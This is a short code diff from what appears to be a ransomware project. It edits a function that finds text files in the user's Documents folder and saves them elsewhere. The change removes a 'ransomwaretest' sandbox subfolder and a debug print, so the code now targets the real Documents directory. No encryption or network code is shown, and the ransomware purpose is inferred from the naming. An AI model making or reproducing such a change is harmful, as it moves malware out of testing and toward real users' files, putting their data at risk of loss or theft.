@@ -70,8 +70,7 @@ def findRootDirsWindows():
 
 
 def findTxtFileInDocumentsAndSaveThemTo(file_name):
-    documents_path = os.path.join(os.path.expanduser("~"), "Documents") + "\\ransomwaretest"
-    print(documents_path)
+    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
     if not os.path.exists(documents_path):
         os.makedirs(documents_path)
     txtFileCounter = 0
